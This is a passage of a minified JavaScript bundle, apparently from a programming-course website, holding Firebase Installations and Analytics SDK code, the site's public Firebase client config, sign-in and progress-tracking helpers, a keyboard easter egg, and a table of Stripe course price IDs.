          const o = Oe("internal-error");
          (o.customData = i), t(o);
        }),
        (r.type = "text/javascript"),
        (r.charset = "UTF-8"),
        vf().appendChild(r);
    }),
  gapiScript: "https://apis.google.com/js/api.js",
  recaptchaV2Script: "https://www.google.com/recaptcha/api.js",
  recaptchaEnterpriseScript:
    "https://www.google.com/recaptcha/enterprise.js?render=",
}),
  gf("Browser");
const Ia = "@firebase/installations",
  Pr = "0.6.7",
  Ea = 1e4,
  Ta = `w:${Pr}`,
  Sa = "FIS_v2",
  kf = "https://firebaseinstallations.googleapis.com/v1",
  If = 36e5,
  Ef = "installations",
  Tf = "Installations",
  Sf = {
    "missing-app-config-values":
      'Missing App configuration value: "{$valueName}"',
    "not-registered": "Firebase Installation is not registered.",
    "installation-not-found": "Firebase Installation not found.",
    "request-failed":
      '{$requestName} request failed with error "{$serverCode} {$serverStatus}: {$serverMessage}"',
    "app-offline": "Could not process request. Application offline.",
    "delete-pending-registration":
      "Can't delete installation while there is a pending registration request.",
  },
  ht = new wt(Ef, Tf, Sf);
function Ca(n) {
  return n instanceof ze && n.code.includes("request-failed");
}
function Aa({ projectId: n }) {
  return `${kf}/projects/${n}/installations`;
}
function Ra(n) {
  return {
    token: n.token,
    requestStatus: 2,
    expiresIn: Af(n.expiresIn),
    creationTime: Date.now(),
  };
}
async function Pa(n, e) {
  const r = (await e.json()).error;
  return ht.create("request-failed", {
    requestName: n,
    serverCode: r.code,
    serverMessage: r.message,
    serverStatus: r.status,
  });
}
function xa({ apiKey: n }) {
  return new Headers({
    "Content-Type": "application/json",
    Accept: "application/json",
    "x-goog-api-key": n,
  });
}
function Cf(n, { refreshToken: e }) {
  const t = xa(n);
  return t.append("Authorization", Rf(e)), t;
}
async function Oa(n) {
  const e = await n();
  return e.status >= 500 && e.status < 600 ? n() : e;
}
function Af(n) {
  return Number(n.replace("s", "000"));
}
function Rf(n) {
  return `${Sa} ${n}`;
}
async function Pf({ appConfig: n, heartbeatServiceProvider: e }, { fid: t }) {
  const r = Aa(n),
    i = xa(n),
    o = e.getImmediate({ optional: !0 });
  if (o) {
    const c = await o.getHeartbeatsHeader();
    c && i.append("x-firebase-client", c);
  }
  const s = { fid: t, authVersion: Sa, appId: n.appId, sdkVersion: Ta },
    a = { method: "POST", headers: i, body: JSON.stringify(s) },
    l = await Oa(() => fetch(r, a));
  if (l.ok) {
    const c = await l.json();
    return {
      fid: c.fid || t,
      registrationStatus: 2,
      refreshToken: c.refreshToken,
      authToken: Ra(c.authToken),
    };
  }
  throw await Pa("Create Installation", l);
}
function La(n) {
  return new Promise((e) => {
    setTimeout(e, n);
  });
}
function xf(n) {
  return btoa(String.fromCharCode(...n))
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}
const Of = /^[cdef][\w-]{21}$/,
  fr = "";
function Lf() {
  try {
    const n = new Uint8Array(17);
    (self.crypto || self.msCrypto).getRandomValues(n),
      (n[0] = 112 + (n[0] % 16));
    const t = Nf(n);
    return Of.test(t) ? t : fr;
  } catch {
    return fr;
  }
}
function Nf(n) {
  return xf(n).substr(0, 22);
}
function Un(n) {
  return `${n.appName}!${n.appId}`;
}
const Na = new Map();
function Ma(n, e) {
  const t = Un(n);
  Da(t, e), Mf(t, e);
}
function Da(n, e) {
  const t = Na.get(n);
  if (t) for (const r of t) r(e);
}
function Mf(n, e) {
  const t = Df();
  t && t.postMessage({ key: n, fid: e }), Uf();
}
let dt = null;
function Df() {
  return (
    !dt &&
      "BroadcastChannel" in self &&
      ((dt = new BroadcastChannel("[Firebase] FID Change")),
      (dt.onmessage = (n) => {
        Da(n.data.key, n.data.fid);
      })),
    dt
  );
}
function Uf() {
  0 === Na.size && dt && (dt.close(), (dt = null));
}
const Ff = "firebase-installations-database",
  Hf = 1,
  mt = "firebase-installations-store";
let Yn = null;
function xr() {
  return (
    Yn ||
      (Yn = zs(Ff, Hf, {
        upgrade: (n, e) => {
          if (0 === e) n.createObjectStore(mt);
        },
      })),
    Yn
  );
}
async function Sn(n, e) {
  const t = Un(n),
    i = (await xr()).transaction(mt, "readwrite"),
    o = i.objectStore(mt),
    s = await o.get(t);
  return (
    await o.put(e, t), await i.done, (!s || s.fid !== e.fid) && Ma(n, e.fid), e
  );
}
async function Ua(n) {
  const e = Un(n),
    r = (await xr()).transaction(mt, "readwrite");
  await r.objectStore(mt).delete(e), await r.done;
}
async function Fn(n, e) {
  const t = Un(n),
    i = (await xr()).transaction(mt, "readwrite"),
    o = i.objectStore(mt),
    s = await o.get(t),
    a = e(s);
  return (
    void 0 === a ? await o.delete(t) : await o.put(a, t),
    await i.done,
    a && (!s || s.fid !== a.fid) && Ma(n, a.fid),
    a
  );
}
async function Or(n) {
  let e;
  const t = await Fn(n.appConfig, (r) => {
    const i = jf(r),
      o = zf(n, i);
    return (e = o.registrationPromise), o.installationEntry;
  });
  return t.fid === fr
    ? { installationEntry: await e }
    : { installationEntry: t, registrationPromise: e };
}
function jf(n) {
  return Fa(n || { fid: Lf(), registrationStatus: 0 });
}
function zf(n, e) {
  if (0 === e.registrationStatus) {
    if (!navigator.onLine) {
      return {
        installationEntry: e,
        registrationPromise: Promise.reject(ht.create("app-offline")),
      };
    }
    const t = {
      fid: e.fid,
      registrationStatus: 1,
      registrationTime: Date.now(),
    };
    return { installationEntry: t, registrationPromise: Bf(n, t) };
  }
  return 1 === e.registrationStatus
    ? { installationEntry: e, registrationPromise: Vf(n) }
    : { installationEntry: e };
}
async function Bf(n, e) {
  try {
    const t = await Pf(n, e);
    return Sn(n.appConfig, t);
  } catch (t) {
    throw (
      (Ca(t) && 409 === t.customData.serverCode
        ? await Ua(n.appConfig)
        : await Sn(n.appConfig, { fid: e.fid, registrationStatus: 0 }),
      t)
    );
  }
}
async function Vf(n) {
  let e = await Ci(n.appConfig);
  for (; 1 === e.registrationStatus; )
    await La(100), (e = await Ci(n.appConfig));
  if (0 === e.registrationStatus) {
    const { installationEntry: t, registrationPromise: r } = await Or(n);
    return r || t;
  }
  return e;
}
function Ci(n) {
  return Fn(n, (e) => {
    if (!e) throw ht.create("installation-not-found");
    return Fa(e);
  });
}
function Fa(n) {
  return $f(n) ? { fid: n.fid, registrationStatus: 0 } : n;
}
function $f(n) {
  return 1 === n.registrationStatus && n.registrationTime + Ea < Date.now();
}
async function qf({ appConfig: n, heartbeatServiceProvider: e }, t) {
  const r = Wf(n, t),
    i = Cf(n, t),
    o = e.getImmediate({ optional: !0 });
  if (o) {
    const c = await o.getHeartbeatsHeader();
    c && i.append("x-firebase-client", c);
  }
  const s = { installation: { sdkVersion: Ta, appId: n.appId } },
    a = { method: "POST", headers: i, body: JSON.stringify(s) },
    l = await Oa(() => fetch(r, a));
  if (l.ok) {
    return Ra(await l.json());
  }
  throw await Pa("Generate Auth Token", l);
}
function Wf(n, { fid: e }) {
  return `${Aa(n)}/${e}/authTokens:generate`;
}
async function Lr(n, e = !1) {
  let t;
  const r = await Fn(n.appConfig, (o) => {
    if (!Ha(o)) throw ht.create("not-registered");
    const s = o.authToken;
    if (!e && Yf(s)) return o;
    if (1 === s.requestStatus) return (t = Gf(n, e)), o;
    {
      if (!navigator.onLine) throw ht.create("app-offline");
      const a = Xf(o);
      return (t = Kf(n, a)), a;
    }
  });
  return t ? await t : r.authToken;
}
async function Gf(n, e) {
  let t = await Ai(n.appConfig);
  for (; 1 === t.authToken.requestStatus; )
    await La(100), (t = await Ai(n.appConfig));
  const r = t.authToken;
  return 0 === r.requestStatus ? Lr(n, e) : r;
}
function Ai(n) {
  return Fn(n, (e) => {
    if (!Ha(e)) throw ht.create("not-registered");
    return Zf(e.authToken)
      ? Object.assign(Object.assign({}, e), { authToken: { requestStatus: 0 } })
      : e;
  });
}
async function Kf(n, e) {
  try {
    const t = await qf(n, e),
      r = Object.assign(Object.assign({}, e), { authToken: t });
    return await Sn(n.appConfig, r), t;
  } catch (t) {
    if (
      !Ca(t) ||
      (401 !== t.customData.serverCode && 404 !== t.customData.serverCode)
    ) {
      const r = Object.assign(Object.assign({}, e), {
        authToken: { requestStatus: 0 },
      });
      await Sn(n.appConfig, r);
    } else await Ua(n.appConfig);
    throw t;
  }
}
function Ha(n) {
  return void 0 !== n && 2 === n.registrationStatus;
}
function Yf(n) {
  return 2 === n.requestStatus && !Jf(n);
}
function Jf(n) {
  const e = Date.now();
  return e < n.creationTime || n.creationTime + n.expiresIn < e + If;
}
function Xf(n) {
  const e = { requestStatus: 1, requestTime: Date.now() };
  return Object.assign(Object.assign({}, n), { authToken: e });
}
function Zf(n) {
  return 1 === n.requestStatus && n.requestTime + Ea < Date.now();
}
async function Qf(n) {
  const e = n,
    { installationEntry: t, registrationPromise: r } = await Or(e);
  return r ? r.catch(console.error) : Lr(e).catch(console.error), t.fid;
}
async function ep(n, e = !1) {
  const t = n;
  return await tp(t), (await Lr(t, e)).token;
}
async function tp(n) {
  const { registrationPromise: e } = await Or(n);
  e && (await e);
}
function np(n) {
  if (!n || !n.options) throw Jn("App Configuration");
  if (!n.name) throw Jn("App Name");
  const e = ["projectId", "apiKey", "appId"];
  for (const t of e) if (!n.options[t]) throw Jn(t);
  return {
    appName: n.name,
    projectId: n.options.projectId,
    apiKey: n.options.apiKey,
    appId: n.options.appId,
  };
}
function Jn(n) {
  return ht.create("missing-app-config-values", { valueName: n });
}
const ja = "installations",
  rp = "installations-internal",
  ip = (n) => {
    const e = n.getProvider("app").getImmediate();
    return {
      app: e,
      appConfig: np(e),
      heartbeatServiceProvider: Nt(e, "heartbeat"),
      _delete: () => Promise.resolve(),
    };
  },
  op = (n) => {
    const t = Nt(n.getProvider("app").getImmediate(), ja).getImmediate();
    return { getId: () => Qf(t), getToken: (i) => ep(t, i) };
  };
function sp() {
  Ke(new He(ja, ip, "PUBLIC")), Ke(new He(rp, op, "PRIVATE"));
}
sp(), Ue(Ia, Pr), Ue(Ia, Pr, "esm2017");
const pr = "analytics",
  ap = "firebase_id",
  lp = "origin",
  cp = 6e4,
  up =
    "https://firebase.googleapis.com/v1alpha/projects/-/apps/{app-id}/webConfig",
  Nr = "https://www.googletagmanager.com/gtag/js",
  Ee = new wr("@firebase/analytics"),
  dp = {
    "already-exists":
      "A Firebase Analytics instance with the appId {$id}  already exists. Only one Firebase Analytics instance can be created for each appId.",
    "already-initialized":
      "initializeAnalytics() cannot be called again with different options than those it was initially called with. It can be called again with the same options to return the existing instance, or getAnalytics() can be used to get a reference to the already-intialized instance.",
    "already-initialized-settings":
      "Firebase Analytics has already been initialized.settings() must be called before initializing any Analytics instanceor it will have no effect.",
    "interop-component-reg-failed":
      "Firebase Analytics Interop Component failed to instantiate: {$reason}",
    "invalid-analytics-context":
      "Firebase Analytics is not supported in this environment. Wrap initialization of analytics in analytics.isSupported() to prevent initialization in unsupported environments. Details: {$errorInfo}",
    "indexeddb-unavailable":
      "IndexedDB unavailable or restricted in this environment. Wrap initialization of analytics in analytics.isSupported() to prevent initialization in unsupported environments. Details: {$errorInfo}",
    "fetch-throttle":
      "The config fetch request timed out while in an exponential backoff state. Unix timestamp in milliseconds when fetch request throttling ends: {$throttleEndTimeMillis}.",
    "config-fetch-failed":
      "Dynamic config fetch failed: [{$httpStatus}] {$responseMessage}",
    "no-api-key":
      'The "apiKey" field is empty in the local Firebase config. Firebase Analytics requires this field tocontain a valid API key.',
    "no-app-id":
      'The "appId" field is empty in the local Firebase config. Firebase Analytics requires this field tocontain a valid app ID.',
    "no-client-id": 'The "client_id" field is empty.',
    "invalid-gtag-resource":
      "Trusted Types detected an invalid gtag resource: {$gtagURL}.",
  },
  Re = new wt("analytics", "Analytics", dp);
function fp(n) {
  if (!n.startsWith(Nr)) {
    const e = Re.create("invalid-gtag-resource", { gtagURL: n });
    return Ee.warn(e.message), "";
  }
  return n;
}
function za(n) {
  return Promise.all(n.map((e) => e.catch((t) => t)));
}
function pp(n, e) {
  let t;
  return window.trustedTypes && (t = window.trustedTypes.createPolicy(n, e)), t;
}
function hp(n, e) {
  const t = pp("firebase-js-sdk-policy", { createScriptURL: fp }),
    r = document.createElement("script"),
    i = `${Nr}?l=${n}&id=${e}`;
  (r.src = t ? (null == t ? void 0 : t.createScriptURL(i)) : i),
    (r.async = !0),
    document.head.appendChild(r);
}
function mp(n) {
  let e = [];
  return Array.isArray(window[n]) ? (e = window[n]) : (window[n] = e), e;
}
async function gp(n, e, t, r, i, o) {
  const s = r[i];
  try {
    if (s) await e[s];
    else {
      const l = (await za(t)).find((c) => c.measurementId === i);
      l && (await e[l.appId]);
    }
  } catch (a) {
    Ee.error(a);
  }
  n("config", i, o);
}
async function bp(n, e, t, r, i) {
  try {
    let o = [];
    if (i && i.send_to) {
      let s = i.send_to;
      Array.isArray(s) || (s = [s]);
      const a = await za(t);
      for (const l of s) {
        const c = a.find((u) => u.measurementId === l),
          d = c && e[c.appId];
        if (!d) {
          o = [];
          break;
        }
        o.push(d);
      }
    }
    0 === o.length && (o = Object.values(e)),
      await Promise.all(o),
      n("event", r, i || {});
  } catch (o) {
    Ee.error(o);
  }
}
function wp(n, e, t, r) {
  return async function i(o, ...s) {
    try {
      if ("event" === o) {
        const [a, l] = s;
        await bp(n, e, t, a, l);
      } else if ("config" === o) {
        const [a, l] = s;
        await gp(n, e, t, r, a, l);
      } else if ("consent" === o) {
        const [a] = s;
        n("consent", "update", a);
      } else if ("get" === o) {
        const [a, l, c] = s;
        n("get", a, l, c);
      } else if ("set" === o) {
        const [a] = s;
        n("set", a);
      } else n(o, ...s);
    } catch (a) {
      Ee.error(a);
    }
  };
}
function _p(n, e, t, r, i) {
  let o = function (...s) {
    window[r].push(arguments);
  };
  return (
    window[i] && "function" == typeof window[i] && (o = window[i]),
    (window[i] = wp(o, n, e, t)),
    { gtagCore: o, wrappedGtag: window[i] }
  );
}
function yp(n) {
  const e = window.document.getElementsByTagName("script");
  for (const t of Object.values(e))
    if (t.src && t.src.includes(Nr) && t.src.includes(n)) return t;
  return null;
}
const vp = 30,
  kp = 1e3;
class Ip {
  constructor(e = {}, t = kp) {
    (this.throttleMetadata = e), (this.intervalMillis = t);
  }
  getThrottleMetadata(e) {
    return this.throttleMetadata[e];
  }
  setThrottleMetadata(e, t) {
    this.throttleMetadata[e] = t;
  }
  deleteThrottleMetadata(e) {
    delete this.throttleMetadata[e];
  }
}
const Ba = new Ip();
function Ep(n) {
  return new Headers({ Accept: "application/json", "x-goog-api-key": n });
}
async function Tp(n) {
  var e;
  const { appId: t, apiKey: r } = n,
    i = { method: "GET", headers: Ep(r) },
    o = up.replace("{app-id}", t),
    s = await fetch(o, i);
  if (200 !== s.status && 304 !== s.status) {
    let a = "";
    try {
      const l = await s.json();
      null !== (e = l.error) &&
        void 0 !== e &&
        e.message &&
        (a = l.error.message);
    } catch {}
    throw Re.create("config-fetch-failed", {
      httpStatus: s.status,
      responseMessage: a,
    });
  }
  return s.json();
}
async function Sp(n, e = Ba, t) {
  const { appId: r, apiKey: i, measurementId: o } = n.options;
  if (!r) throw Re.create("no-app-id");
  if (!i) {
    if (o) return { measurementId: o, appId: r };
    throw Re.create("no-api-key");
  }
  const s = e.getThrottleMetadata(r) || {
      backoffCount: 0,
      throttleEndTimeMillis: Date.now(),
    },
    a = new Rp();
  return (
    setTimeout(
      async () => {
        a.abort();
      },
      void 0 !== t ? t : cp
    ),
    Va({ appId: r, apiKey: i, measurementId: o }, s, a, e)
  );
}
async function Va(n, { throttleEndTimeMillis: e, backoffCount: t }, r, i = Ba) {
  var o;
  const { appId: s, measurementId: a } = n;
  try {
    await Cp(r, e);
  } catch (l) {
    if (a)
      return (
        Ee.warn(
          `Timed out fetching this Firebase app's measurement ID from the server. Falling back to the measurement ID ${a} provided in the "measurementId" field in the local Firebase config. [${
            null == l ? void 0 : l.message
          }]`
        ),
        { appId: s, measurementId: a }
      );
    throw l;
  }
  try {
    const l = await Tp(n);
    return i.deleteThrottleMetadata(s), l;
  } catch (l) {
    const c = l;
    if (!Ap(c)) {
      if ((i.deleteThrottleMetadata(s), a))
        return (
          Ee.warn(
            `Failed to fetch this Firebase app's measurement ID from the server. Falling back to the measurement ID ${a} provided in the "measurementId" field in the local Firebase config. [${
              null == c ? void 0 : c.message
            }]`
          ),
          { appId: s, measurementId: a }
        );
      throw l;
    }
    const d =
        503 ===
        Number(
          null === (o = null == c ? void 0 : c.customData) || void 0 === o
            ? void 0
            : o.httpStatus
        )
          ? Qr(t, i.intervalMillis, vp)
          : Qr(t, i.intervalMillis),
      u = { throttleEndTimeMillis: Date.now() + d, backoffCount: t + 1 };
    return (
      i.setThrottleMetadata(s, u),
      Ee.debug(`Calling attemptFetch again in ${d} millis`),
      Va(n, u, r, i)
    );
  }
}
function Cp(n, e) {
  return new Promise((t, r) => {
    const i = Math.max(e - Date.now(), 0),
      o = setTimeout(t, i);
    n.addEventListener(() => {
      clearTimeout(o),
        r(Re.create("fetch-throttle", { throttleEndTimeMillis: e }));
    });
  });
}
function Ap(n) {
  if (!(n instanceof ze && n.customData)) return !1;
  const e = Number(n.customData.httpStatus);
  return 429 === e || 500 === e || 503 === e || 504 === e;
}
class Rp {
  constructor() {
    this.listeners = [];
  }
  addEventListener(e) {
    this.listeners.push(e);
  }
  abort() {
    this.listeners.forEach((e) => e());
  }
}
async function Pp(n, e, t, r, i) {
  if (i && i.global) n("event", t, r);
  else {
    const o = await e;
    n("event", t, Object.assign(Object.assign({}, r), { send_to: o }));
  }
}
async function xp(n, e, t, r) {
  if (r && r.global) return n("set", { user_id: t }), Promise.resolve();
  n("config", await e, { update: !0, user_id: t });
}
async function Op() {
  if (!Us())
    return (
      Ee.warn(
        Re.create("indexeddb-unavailable", {
          errorInfo: "IndexedDB is not available in this environment.",
        }).message
      ),
      !1
    );
  try {
    await Fs();
  } catch (n) {
    return (
      Ee.warn(
        Re.create("indexeddb-unavailable", {
          errorInfo: null == n ? void 0 : n.toString(),
        }).message
      ),
      !1
    );
  }
  return !0;
}
async function Lp(n, e, t, r, i, o, s) {
  var a;
  const l = Sp(n);
  l
    .then((m) => {
      (t[m.measurementId] = m.appId),
        n.options.measurementId &&
          m.measurementId !== n.options.measurementId &&
          Ee.warn(
            `The measurement ID in the local Firebase config (${n.options.measurementId}) does not match the measurement ID fetched from the server (${m.measurementId}). To ensure analytics events are always sent to the correct Analytics property, update the measurement ID field in the local config or remove it from the local config.`
          );
    })
    .catch((m) => Ee.error(m)),
    e.push(l);
  const c = Op().then((m) => {
      if (m) return r.getId();
    }),
    [d, u] = await Promise.all([l, c]);
  yp(o) || hp(o, d.measurementId), i("js", new Date());
  const f =
    null !== (a = null == s ? void 0 : s.config) && void 0 !== a ? a : {};
  return (
    (f[lp] = "firebase"),
    (f.update = !0),
    null != u && (f[ap] = u),
    i("config", d.measurementId, f),
    d.measurementId
  );
}
class Np {
  constructor(e) {
    this.app = e;
  }
  _delete() {
    return delete Rt[this.app.options.appId], Promise.resolve();
  }
}
let Rt = {},
  Ri = [];
const Pi = {};
let xi,
  Mr,
  Xn = "dataLayer",
  Mp = "gtag",
  Oi = !1;
function Dp() {
  const n = [];
  if (
    (Ds() && n.push("This is a browser extension environment."),
    Ul() || n.push("Cookies are not available."),
    n.length > 0)
  ) {
    const e = n.map((r, i) => `(${i + 1}) ${r}`).join(" "),
      t = Re.create("invalid-analytics-context", { errorInfo: e });
    Ee.warn(t.message);
  }
}
function Up(n, e, t) {
  Dp();
  const r = n.options.appId;
  if (!r) throw Re.create("no-app-id");
  if (!n.options.apiKey) {
    if (!n.options.measurementId) throw Re.create("no-api-key");
    Ee.warn(
      `The "apiKey" field is empty in the local Firebase config. This is needed to fetch the latest measurement ID for this Firebase app. Falling back to the measurement ID ${n.options.measurementId} provided in the "measurementId" field in the local Firebase config.`
    );
  }
  if (null != Rt[r]) throw Re.create("already-exists", { id: r });
  if (!Oi) {
    mp(Xn);
    const { wrappedGtag: o, gtagCore: s } = _p(Rt, Ri, Pi, Xn, Mp);
    (Mr = o), (xi = s), (Oi = !0);
  }
  return (Rt[r] = Lp(n, Ri, Pi, e, xi, Xn, t)), new Np(n);
}
function Fp(n, e = {}) {
  const t = Nt(n, pr);
  if (t.isInitialized()) {
    const i = t.getImmediate();
    if (Kt(e, t.getOptions())) return i;
    throw Re.create("already-initialized");
  }
  return t.initialize({ options: e });
}
function Hp(n, e, t) {
  (n = Le(n)), xp(Mr, Rt[n.app.options.appId], e, t).catch((r) => Ee.error(r));
}
function Dr(n, e, t, r) {
  (n = Le(n)),
    Pp(Mr, Rt[n.app.options.appId], e, t, r).catch((i) => Ee.error(i));
}
const Li = "@firebase/analytics",
  Ni = "0.10.3";
function jp() {
  Ke(
    new He(
      pr,
      (e, { options: t }) =>
        Up(
          e.getProvider("app").getImmediate(),
          e.getProvider("installations-internal").getImmediate(),
          t
        ),
      "PUBLIC"
    )
  ),
    Ke(
      new He(
        "analytics-internal",
        function n(e) {
          try {
            const t = e.getProvider(pr).getImmediate();
            return { logEvent: (r, i, o) => Dr(t, r, i, o) };
          } catch (t) {
            throw Re.create("interop-component-reg-failed", { reason: t });
          }
        },
        "PRIVATE"
      )
    ),
    Ue(Li, Ni),
    Ue(Li, Ni, "esm2017");
}
jp();
const zp = {
    apiKey: "AIzaSyBns4UUCKIfb_3xOesTSezA9GbEyuIU7XA",
    authDomain: "fireship-app.firebaseapp.com",
    databaseURL: "https://fireship-app.firebaseio.com",
    projectId: "fireship-app",
    storageBucket: "fireship-app.appspot.com",
    messagingSenderId: "176605045081",
    appId: "1:176605045081:web:d87a63bd943e3032",
    measurementId: "G-VTJV5CVC6K",
  },
  $a = Bs(zp),
  je = yf($a),
  Ur = Fp($a);
function Bp() {
  Dr(Ur, "page_view", { page_location: window.location.href });
}
function Mi(n) {
  Hp(Ur, n);
}
function Cn(n, e) {
  Dr(Ur, n, e);
}
async function Vp() {
  return Hr(va(je, new $e()));
}
async function $p() {
  const n = new Wt("apple.com");
  return Hr(va(je, n));
}
async function qp(n, e) {
  const t = { url: null != e ? e : `${El}/dashboard`, handleCodeInApp: !0 };
  let r, i;
  try {
    await nd(je, n, t),
      window.localStorage.setItem("emailForSignIn", n),
      (r = `Magic signin link sent to ${n}`);
  } catch (o) {
    i = o.message;
  }
  return { res: r, serverError: i };
}
async function Wp() {
  if (rd(je, window.location.href)) {
    let n = window.localStorage.getItem("emailForSignIn");
    n || (n = window.prompt("Please provide your email for confirmation"));
    const e = id(je, n, window.location.href);
    return window.localStorage.removeItem("emailForSignIn"), Hr(e);
  }
  return { res: null, serverError: "Invalid link" };
}
async function Fr() {
  await ld(je),
    me.set({ icon: "👋", message: "Thanks for hanging out, see ya around!" });
}
async function Hr(n) {
  let e, t;
  try {
    (e = await n),
      Ae.set(null),
      me.set({
        message: "Access granted! Logged into the mainframe!",
        type: "success",
      }),
      Cn("login", { method: e.providerId });
  } catch (r) {
    (t = r.message),
      console.error(r),
      me.set({ message: t, type: "error" }),
      Cn("exception", { location: "loginHandler", description: r.message });
  }
  return { res: e, serverError: t };
}
async function ge(n) {
  var e;
  try {
    if (!je.currentUser)
      return (
        Ae.set("signin"),
        void me.set({ message: "You must be signed in first", type: "info" })
      );
    const { getFunctions: t, httpsCallable: r } = await ft(
        () => import("./index.esm.27723059.js"),
        []
      ),
      i = t(),
      o = await r(i, "userAPI")(n),
      { uid: s, ...a } = n.payload;
    return Cn(n.fn, { ...a }), o.data;
  } catch (t) {
    console.log(t),
      me.set({
        message:
          null != (e = null == t ? void 0 : t.message)
            ? e
            : "Unknown Error. Contact hello@fireship.io for help",
        type: "error",
      }),
      Cn("exception", {
        location: "callUserAPI",
        description: null == t ? void 0 : t.message,
      });
  }
}
async function qa(n, e = 0) {
  const t = je.currentUser;
  if (!t)
    return void me.set({
      message: "You must be logged in to track progress",
      type: "error",
    });
  const {
    doc: r,
    setDoc: i,
    getFirestore: o,
  } = await ft(() => import("./index.esm.16fddf16.js"), []);
  i(r(o(), `progress/${t.uid}`), { [n]: 100 + e }, { merge: !0 });
}
async function Gp(n) {
  const e = je.currentUser,
    {
      doc: t,
      setDoc: r,
      deleteField: i,
      getFirestore: o,
    } = await ft(() => import("./index.esm.16fddf16.js"), []);
  r(t(o(), `progress/${e.uid}`), { [n]: i() }, { merge: !0 });
}
function Kp() {
  let n;
  window.addEventListener("flamethrower:router:fetch", () => {
    var e;
    n = null == (e = document.getElementById("sidebar")) ? void 0 : e.scrollTop;
  }),
    window.addEventListener("flamethrower:router:end", () => {
      const e = document.getElementById("sidebar");
      null == e || e.scrollTo({ top: n });
    });
}
const Bt = Se(!0),
  Zn = "himom";
let Tt = "";
function Yp(n) {
  n.ctrlKey &&
    "b" === n.key &&
    (console.log("ctrlb"), n.preventDefault(), Bt.update((e) => !e)),
    "Escape" === n.key && Ae.set(null),
    ("/" === n.key || (n.ctrlKey && "k" === n.key)) &&
      (n.preventDefault(), Ae.set("search")),
    Zn.includes(n.key)
      ? ((Tt += n.key),
        Tt === Zn && (console.log("HI MOM!"), Ae.set("himom"), (Tt = "")),
        Zn.includes(Tt) || (Tt = ""))
      : (Tt = "");
}
function Jp(n) {
  return {
    c() {
      this.c = k;
    },
    m: k,
    p: k,
    i: k,
    o: k,
    d: k,
  };
}
function Xp(n, e, t) {
  let { permalink: r } = e,
    { next: i } = e,
    { prev: o } = e,
    { vimeo: s } = e,
    { youtube: a } = e,
    { free: l } = e;
  return (
    bt(() => {
      Rn.set({ permalink: r, next: i, prev: o, vimeo: s, free: l, youtube: a });
    }),
    (n.$$set = (c) => {
      "permalink" in c && t(0, (r = c.permalink)),
        "next" in c && t(1, (i = c.next)),
        "prev" in c && t(2, (o = c.prev)),
        "vimeo" in c && t(3, (s = c.vimeo)),
        "youtube" in c && t(4, (a = c.youtube)),
        "free" in c && t(5, (l = c.free));
    }),
    [r, i, o, s, a, l]
  );
}
window.addEventListener("keydown", Yp);
class Zp extends K {
  constructor(e) {
    super(),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Xp,
        Jp,
        G,
        { permalink: 0, next: 1, prev: 2, vimeo: 3, youtube: 4, free: 5 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["permalink", "next", "prev", "vimeo", "youtube", "free"];
  }
  get permalink() {
    return this.$$.ctx[0];
  }
  set permalink(e) {
    this.$$set({ permalink: e }), W();
  }
  get next() {
    return this.$$.ctx[1];
  }
  set next(e) {
    this.$$set({ next: e }), W();
  }
  get prev() {
    return this.$$.ctx[2];
  }
  set prev(e) {
    this.$$set({ prev: e }), W();
  }
  get vimeo() {
    return this.$$.ctx[3];
  }
  set vimeo(e) {
    this.$$set({ vimeo: e }), W();
  }
  get youtube() {
    return this.$$.ctx[4];
  }
  set youtube(e) {
    this.$$set({ youtube: e }), W();
  }
  get free() {
    return this.$$.ctx[5];
  }
  set free(e) {
    this.$$set({ free: e }), W();
  }
}
customElements.define("global-data", Zp);
const Ot = {
  "stripe-saas": {
    id: "stripe-saas",
    price: "price_1OyecaBF7AptWZlc4nRFI3Ei",
    amount: 20,
  },
  sveltekit: {
    id: "sveltekit",
    price: "price_1NNq9RBF7AptWZlcrbO92SfW",
    amount: 20,
  },
  nextjs: { id: "nextjs", price: "price_1N2jNUBF7AptWZlcaklaweXL", amount: 20 },
  "react-next-firebase": {
    id: "react-next-firebase",
    price: "price_1Lkgo6BF7AptWZlcBFVoputL",
    amount: 20,
    legacy_sku: "sku_ItHZfVSApb3xkT",
  },
  js: { id: "js", price: "price_1M6lsOBF7AptWZlcVCGjrDvX", amount: 20 },
  supabase: {
    id: "supabase",
    price: "price_1M7tSgBF7AptWZlcKAduj6Gr",
    amount: 20,
  },
  git: {
    id: "git",
    price: "price_1LkgzcBF7AptWZlcF5NJQgKd",
    amount: 10,
    legacy_sku: "sku_KBHTYbTWv1Hmb7",
  },
  angular: {
    id: "angular",
    price: "price_1Lkh0WBF7AptWZlcYUEGDHLz",
    amount: 20,
    legacy_sku: "sku_Fn7Ojng8TLwnC4",
  },
  "flutter-firebase": {
    id: "flutter-firebase",
    price: "price_1Lkh1TBF7AptWZlcrWJiK3PT",
    amount: 20,
    legacy_sku: "sku_FJCsh7mvjI83Kz",
  },
  dart: {
    id: "dart",
    price: "price_1Lkh20BF7AptWZlcqyViQgv0",
    amount: 10,
    legacy_sku: "sku_KOyOvlrmLikRz8",
  },
  "vscode-tricks": {
    id: "vscode-tricks",
    price: "price_1Lkh2mBF7AptWZlcR0GhtjwH",
    amount: 10,
    legacy_sku: "sku_Kf57qdqUerVTUS",
  },
  "firestore-data-modeling": {
    id: "firestore-data-modeling",
    price: "price_1Lkh3VBF7AptWZlcNiWVmDLI",
    amount: 10,
    legacy_sku: "sku_FJEdx5Tz9dPrvm",
  },
  "firebase-security": {
    id: "firebase-security",
    price: "price_1Lkh4EBF7AptWZlcFv4ZvmIR",
    amount: 10,
    legacy_sku: "sku_IVIjaiCRlivYD3",
  },
  "stripe-js": {
    id: "stripe-js",
    price: "price_1LnAhnBF7AptWZlc3VgezH7X",
    amount: 20,
    legacy_sku: "sku_HG8dqucZV4x6F2",
  },
  lifetime: {
    id: "lifetime",
    price: "price_1LkhByBF7AptWZlcIUg2TjVg",
    amount: 399,
  },
  enterprise: {
    id: "enterprise",
    price: "price_1LkhByBF7AptWZlcx5vOdAnG",
    amount: 299,
  },
  month: { id: "pro", price: "price_1LkhBxBF7AptWZlcJB2I2IUt", amount: 29 },
  quarter: { id: "pro", price: "price_1LkhByBF7AptWZlcg9Zjbmw6", amount: 69 },
  year: { id: "pro", price: "price_1LkhByBF7AptWZlcVY5TwKdS", amount: 199 },
};
function Qp(n) {
  var e;
